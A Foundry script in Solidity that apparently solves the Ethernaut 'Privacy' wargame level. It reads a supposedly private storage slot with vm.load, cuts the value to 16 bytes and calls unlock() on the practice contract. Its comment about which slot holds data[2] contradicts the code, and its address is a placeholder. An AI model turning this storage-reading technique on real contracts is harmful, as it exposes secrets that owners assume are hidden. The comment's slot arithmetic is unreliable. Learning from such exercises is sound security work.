// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import "../src/Privacy.sol";

contract PrivacySolution is Script {
    Privacy public privacyInstance = Privacy(0xYourContractAddressHere); 

function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        
        console.log("Before unlock, Locked:", privacyInstance.locked());

        // data[2] read from storage slot 6 (array starts at slot 4: data[0]=4, data[1]=5, data[2]=6)
        bytes32 data2 = vm.load(address(privacyInstance), bytes32(uint256(5)));
        console.log("data[2]:");
        console.logBytes32(data2);

        // First 16 bytes as bytes16 for unlock
        bytes16 key = bytes16(data2);
        console.log("Key (bytes16):");
        console.logBytes16(key);

        // Unlock
        privacyInstance.unlock(bytes16(key));

        console.log("After unlock, Locked:", privacyInstance.locked());  // false

        vm.stopBroadcast();
    }
}